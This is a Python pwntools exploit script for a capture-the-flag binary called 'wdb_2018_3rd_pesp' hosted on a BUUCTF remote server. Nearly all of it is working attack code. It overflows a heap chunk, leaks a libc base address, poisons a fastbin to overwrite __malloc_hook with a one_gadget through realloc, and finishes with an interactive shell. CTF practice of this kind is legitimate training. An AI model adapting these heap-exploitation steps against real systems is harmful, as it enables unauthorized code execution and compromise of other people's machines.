from pwn import *

#p = process('./wdb_2018_3rd_pesp')
p = remote('node4.buuoj.cn', 29349)
elf = ELF('wdb_2018_3rd_pesp')
libc = ELF('libc-2.23.buu.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

def alloc(size, content):
    sla(b'choice:', b'2')
    sla(b'name:', str(size).encode())
    sa(b'servant:', content)

def delete(idx):
    sla(b'choice:', b'4')
    sla(b'servant:', str(idx).encode())

def edit(idx, size, content):
    sla(b'choice:', b'3')
    sla(b'servant:', str(idx).encode())
    sla(b'name:', str(size).encode())
    sa(b'servnat:', content)

def show():
    sla(b'choice:', b'1')

backdoor = 0x400d49

alloc(0x10, b'a') #0
alloc(0x40, b'a') #1
alloc(0x40, b'a') #2
alloc(0x10, b'a') #3

edit(0, 0x20, b'a' * 0x10 + p64(0) + p64(0xa1))
delete(1)

alloc(0x40, b'a') #1
show()

libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x68 - libc.sym['__malloc_hook']
success('libc_base -> 0x%x' % libc_base)
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['realloc']
one_gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]
one_gadgets_buu = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one = libc_base + one_gadgets_buu[1]

alloc(0x40, b'a') #4
alloc(0x60, b'a') #5

delete(5)
edit(3, 0x28, b'a' * 0x10 + p64(0) + p64(0x71) + p64(malloc_hook - 0x23))
alloc(0x60, b'a')
alloc(0x60, b'a' * 0xb + p64(one) + p64(realloc + 16))

sla(b'choice:', b'2')
sla(b'name:', b'1')

p.interactive()